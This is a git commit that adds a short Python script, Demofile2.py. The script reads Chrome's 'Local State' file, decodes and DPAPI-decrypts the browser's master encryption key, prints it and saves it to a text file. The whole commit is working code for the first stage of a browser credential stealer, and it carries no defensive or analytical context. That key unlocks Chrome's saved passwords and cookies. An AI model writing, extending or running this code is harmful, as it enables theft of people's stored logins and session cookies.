50ee1c371e78530c8e1b94bc4c0686efbf6aa180
Taleh Alizade <81337228+TalehAlizade@users.noreply.github.com>
2021-07-23 11:48:04 +0400

    Add files via upload

---
+++ Demofile2.py
@@ -0,0 +1,26 @@
+import os
+import json
+import base64
+import win32crypt
+
+
+def get_encryption_key():
+    local_state_path = os.path.join(os.environ["USERPROFILE"],
+                                    "AppData", "Local", "Google", "Chrome",
+                                    "User Data", "Local State")
+    with open(local_state_path, "r", encoding="utf-8") as f:
+        local_state = f.read()
+        local_state = json.loads(local_state)
+
+    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+    key = key[5:]
+    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+
+def main():
+    key = get_encryption_key()
+    print(key)
+    f = open("demofile2.txt", "wb")
+    f.write(key)
+    f.close()
+
+main()
